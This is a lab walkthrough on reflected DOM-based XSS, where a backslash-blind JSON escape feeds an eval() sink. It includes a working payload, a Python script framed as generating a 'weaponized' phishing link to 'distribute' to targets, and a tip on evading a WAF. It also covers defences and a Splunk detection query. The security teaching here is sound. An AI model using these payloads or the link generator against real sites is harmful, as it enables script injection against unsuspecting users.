# Lab Walkthrough: Reflected DOM XSS

* **Vulnerability Type:** Reflected DOM-Based Cross-Site Scripting (XSS)
* **Target Context:** Client-Side JavaScript (`eval()` Sink via JSON Reflection)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. 

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Escaping & Context Evaluation Comparison](#4-escaping--context-evaluation-comparison)
5. [Automated Exploitation Script (Python PoC)](#5-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)
9. [References & Standards](#9-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

Reflected DOM XSS occurs when an application receives input in an HTTP request, reflects that input into a data structure (like a JSON object or JavaScript variable) within the response, and subsequently processes that data structure using a dangerous client-side sink (like `eval()`, `innerHTML`, or `document.write`).

* **The Core Flaw:** The backend server attempts to sanitize the input by escaping double quotes (`"` becomes `\"`) before reflecting it into a JSON response. However, the server fails to escape backslashes (`\`). When a malicious payload containing an injected backslash and a quote (`\"`) is processed, the server's own escaping mechanism neutralizes itself.
* **The Sink (`eval()`):** The client-side JavaScript receives this JSON string and passes it directly into the `eval()` function, which executes any valid JavaScript code it contains.
* **Real-World Analogy:** Imagine a prison censor (the backend) tasked with redacting the word "ATTACK" with a black marker. You send a letter containing the instructions: *"Erase the black marker, then ATTACK."* Because the censor doesn't know to censor the phrase "Erase the black marker" (the backslash), the prisoner (the `eval()` function) follows your instructions, undoes the censorship, and executes the command.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   REFLECTED DOM XSS ESCAPING BYPASS                    │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Input] 
  \"-alert(1)}//
           │
           ▼
  [2. Server Backend (Flawed Sanitization)]
  Rule: Escape '"' by prepending '\'. Ignore '\'.
  Input '\"' becomes '\\"'.
           │
           ▼
  [3. Reflected JSON Response]
  {"searchTerm":"\\"-alert(1)}//", "results":[]}
           │
           ▼
  [4. Client Browser / eval() Sink]
  JS Engine interprets '\\' as a single literal backslash.
  The following '"' is unescaped, acting as a string delimiter.
  String closed -> minus operator -> alert(1) executes -> syntax commented.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The blog search functionality (`/?search=`) and the subsequent `/search-results` JSON response.
* **Primary Objective:** Craft a payload that neutralizes the server's quote escaping, breaks out of the JSON string context, and executes the `alert()` function via the `eval()` sink.
* **Validation Signal:** The lab is marked solved when the `alert(1)` pop-up executes in the browser context upon searching.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Sink Identification

* Enter a benign search term (e.g., `CyberTest`).
* View the HTTP history in Burp Suite. Notice the search term triggers a secondary AJAX request that returns a JSON object: `{"searchTerm":"CyberTest", "results":[]}`.
* Analyze the client-side source code (e.g., `searchResults.js`).
* *Observation:* The application processes the JSON response using `eval()`: `var searchResults = eval('(' + responseText + ')');`. This is a highly dangerous sink.

### Phase 2: Sanitization Probing

* Test how the server handles dangerous characters. Inject a double quote: `Cyber"Test`.
* *Observation:* The server escapes it: `{"searchTerm":"Cyber\"Test", "results":[]}`.
* Test how the server handles backslashes. Inject a backslash: `Cyber\Test`.
* *Observation:* The server does *not* escape it: `{"searchTerm":"Cyber\Test", "results":[]}`.

### Phase 3: Payload Construction & Evasion

* **The Goal:** Break out of the `"searchTerm":"..."` string enclosure.
* **The Injection:** `\"-alert(1)}//`
1. `\` (Literal backslash provided by attacker).
2. `"` (Quote provided by attacker. Server prepends a `\` to escape it).
3. `-alert(1)` (Mathematical subtraction operator to separate expressions, followed by the payload).
4. `}//` (Closes the JSON object early and comments out the remaining server-generated characters like `", "results":[]}`).


* **The Evaluation:** The server reflects `{"searchTerm":"\\"-alert(1)}//", "results":[]}`. Inside `eval()`, `\\` becomes `\`, and the following `"` cleanly terminates the string.

### Phase 4: Execution

* Submit the payload in the search bar.
* *Result:* The `eval()` function parses the broken JSON syntax, evaluates the mathematical expression, and executes `alert(1)`.

---

## 4. Escaping & Context Evaluation Comparison

Understanding *where* and *how* data is parsed dictates the viability of an escaping bypass.

| Execution Context | Safe Sanitization | Vulnerability Trigger |
| --- | --- | --- |
| **HTML Context** (`innerHTML`) | HTML Entity Encoding (`&quot;`) | `<script>` or event handlers (`onerror`). |
| **JavaScript String** (`var x='...'`) | Unicode / Hex Escaping (`\x22`) | Unescaped single quotes (`'`) or backslashes (`\`). |
| **JSON parsed via `eval()**` | Strict JSON Validation + Encoding | Escaping `"` without escaping `\` creates a neutralization chain (`\\"`). |
| **JSON parsed via `JSON.parse()**` | N/A (Inherently Safe) | `JSON.parse()` will throw a SyntaxError if structure is broken; code will not execute. |

---

## 5. Automated Exploitation Script (Python PoC)

This script generates the URL-encoded weaponized link designed to exploit the flawed JSON escaping mechanism.

```python
#!/usr/bin/env python3
"""
Reflected DOM XSS Weaponized Link Generator (PoC)
Exploits backslash-blind JSON escaping flowing into an eval() sink.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url):
    # Payload designed to neutralize server-side quote escaping
    # Output expected in DOM: {"searchTerm":"\\"-alert(1)}//"...
    raw_payload = r'\"-alert(1)}//'
    
    # URL encode the payload to ensure safe transport over HTTP
    encoded_payload = urllib.parse.quote(raw_payload)
    
    # Construct the final weaponized URL
    weaponized_link = f"{target_url}/?search={encoded_payload}"
    
    print("[*] Generating Weaponized Reflected DOM XSS Link...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 reflected_dom_xss.py <target_base_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    generate_phishing_link(target)

```

---

## 6. Defense, Hardening & Secure Coding

The primary failure here is the reliance on `eval()` to parse data structures.

* **Eliminate `eval()` (Primary Defense):** Never use `eval()` to process JSON data. Modern JavaScript provides `JSON.parse()`, which safely parses strings into JavaScript objects and is entirely immune to code execution, even if the JSON structure is maliciously manipulated.
* *Vulnerable:* `var data = eval('(' + xhr.responseText + ')');`
* *Secure:* `var data = JSON.parse(xhr.responseText);`


* **Comprehensive Escaping:** If string manipulation must occur on the backend, ensure that *both* quotes (`"`) and backslashes (`\`) are properly escaped.
* **Content Security Policy (CSP):** Implement a strict CSP that explicitly bans the use of `eval()` by omitting `'unsafe-eval'` from the `script-src` directive.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting this attack requires monitoring for structural JSON manipulation characters in URL parameters.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| eval decoded_query=urldecode(uri_query)
| regex decoded_query="(?i)(\\\\\"|\\\\').*?(-|\+|;).*?(alert|eval|confirm|prompt|console\.log|fetch)"
| stats count by src_ip, uri_path, decoded_query
| where count > 0

```

*Indicator of Attack (IoA):* Monitor for search or input parameters containing explicit combinations of backslashes and quotes (`\"` or `\%22`) immediately followed by arithmetic operators (`-`, `+`) and JavaScript execution functions.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload appears literally in search bar (No alert)** | Safe JSON parsing backend. | The application might have been updated to use `JSON.parse()`. If so, XSS via this specific vector is structurally impossible. |
| **Console Error: `SyntaxError: Unexpected token**` | Improper payload termination. | Ensure you are cleanly closing the JSON object. The `}//` is critical for commenting out the remainder of the server's injected JSON string. |
| **WAF blocks the request** | `alert()` signature match. | Replace `alert(1)` with a less common execution function like `prompt(1)` or `console.log(1)` to bypass basic WAF signatures during testing. |

---

## 9. References & Standards

* [OWASP: DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
* [MDN Web Docs: Never use eval()!](https://www.google.com/search?q=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval%23never_use_eval!)
* [PortSwigger: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

---

> **Key Insight:** Flawed input sanitization creates vulnerabilities, but insecure sinks transform them into exploits. While the backend's failure to escape backslashes allows an attacker to break the JSON syntax, it is the client's use of `eval()` that elevates a simple JSON syntax error into full arbitrary JavaScript execution.
